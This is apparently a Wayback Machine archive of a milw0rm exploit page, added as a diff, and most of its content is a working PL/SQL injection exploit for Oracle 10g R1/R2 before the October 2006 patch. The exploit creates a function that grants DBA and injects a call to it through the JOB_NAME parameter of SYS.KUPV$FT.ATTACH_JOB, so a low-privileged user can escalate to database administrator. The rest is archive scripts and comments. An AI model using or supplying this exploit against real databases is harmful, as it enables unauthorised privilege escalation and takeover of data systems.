@@ -1,0 +1,73 @@
+<html><head><script type="text/javascript" src="https://web-static.archive.org/_static/js/bundle-playback.js?v=1B2M2Y8A" charset="utf-8"></script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/wombat.js?v=1B2M2Y8A" charset="utf-8"></script>
+<script>window.RufflePlayer=window.RufflePlayer||{};window.RufflePlayer.config={"autoplay":"on","unmuteOverlay":"hidden","showSwfDownload":true};</script>
+<script type="text/javascript" src="https://web-static.archive.org/_static/js/ruffle/ruffle.js"></script>
+<script type="text/javascript">
+    __wm.init("https://web.archive.org/web");
+  __wm.wombat("http://milw0rm.com/exploits/3179","20100214075610","https://web.archive.org/","web","https://web-static.archive.org/_static/",
+	      "1266134170");
+</script>
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/banner-styles.css?v=1B2M2Y8A" />
+<link rel="stylesheet" type="text/css" href="https://web-static.archive.org/_static/css/iconochive.css?v=1B2M2Y8A" />
+<!-- End Wayback Rewrite JS Include -->
+<title>Oracle 10g SYS.KUPV$FT.ATTACH_JOB PL/SQL Injection Exploit</title></head><pre>/**
+* Exploit for Oracle10g R1 and R2 prior to CPU Oct 2006
+* Joxean Koret &lt;joxeankoret@yahoo.es&gt;
+* Privileges needed:
+*
+* - EXECUTE_CATALOG_ROLE
+* - CREATE PROCEDURE
+*
+*/
+select *
+from user_role_privs
+;
+
+CREATE OR REPLACE FUNCTION F1
+RETURN NUMBER AUTHID CURRENT_USER
+IS
+PRAGMA AUTONOMOUS_TRANSACTION;
+BEGIN
+EXECUTE IMMEDIATE 'GRANT DBA TO TEST';
+COMMIT;
+RETURN(1);
+END;
+/
+
+DECLARE
+USER_NAME VARCHAR2(200);
+JOB_NAME VARCHAR2(200);
+NEW_JOB BOOLEAN;
+v_Return NUMBER;
+BEGIN
+USER_NAME := 'OWNER';
+JOB_NAME := ''' OR ' || USER || '.f1() = 1--';
+
+v_Return := SYS.KUPV$FT.ATTACH_JOB(
+USER_NAME =&gt; USER_NAME,
+JOB_NAME =&gt; JOB_NAME,
+NEW_JOB =&gt; NEW_JOB
+);
+END;
+/
+
+// milw0rm.com [2007-01-23]</pre></html><!--
+     FILE ARCHIVED ON 07:56:10 Feb 14, 2010 AND RETRIEVED FROM THE
+     INTERNET ARCHIVE ON 16:36:18 Jul 26, 2025.
+     JAVASCRIPT APPENDED BY WAYBACK MACHINE, COPYRIGHT INTERNET ARCHIVE.
+
+     ALL OTHER CONTENT MAY ALSO BE PROTECTED BY COPYRIGHT (17 U.S.C.
+     SECTION 108(a)(3)).
+-->
+<!--
+playback timings (ms):
+  captures_list: 0.757
+  exclusion.robots: 0.035
+  exclusion.robots.policy: 0.022
+  esindex: 0.016
+  cdx.remote: 121.351
+  LoadShardBlock: 341.94 (3)
+  PetaboxLoader3.datanode: 187.98 (4)
+  PetaboxLoader3.resolve: 267.161 (2)
+  load_resource: 219.808
+-->
